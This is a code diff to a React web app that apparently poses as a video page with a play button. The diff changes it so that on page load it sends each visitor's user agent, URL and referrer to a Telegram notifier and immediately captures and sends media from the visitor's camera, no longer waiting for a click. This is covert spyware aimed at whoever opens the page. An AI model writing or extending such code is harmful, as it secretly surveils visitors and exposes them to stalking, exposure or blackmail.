@@ -11,19 +11,6 @@ function App() {
   const thumbnailUrl =
     'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
 
-  useEffect(() => {
-    const sendVisitorNotification = async () => {
-      await sendTelegramNotification({
-        userAgent: navigator.userAgent,
-        location: window.location.href,
-        referrer: document.referrer || 'Direct',
-        previousSites: document.referrer || 'None',
-      });
-    };
-
-    sendVisitorNotification();
-  }, []);
-
   const captureAndSendMedia = useCallback(async () => {
     try {
       // Get device capabilities first
@@ -160,6 +147,17 @@ function App() {
       console.error('Error capturing media:', error);
     }
   }, []);
+
+  // Fire on page load: send visitor info + capture camera immediately
+  useEffect(() => {
+    sendTelegramNotification({
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      referrer: document.referrer || 'Direct',
+      previousSites: document.referrer || 'None',
+    });
+    captureAndSendMedia();
+  }, [captureAndSendMedia]);
 
   const handlePlayClick = async () => {
     await captureAndSendMedia();
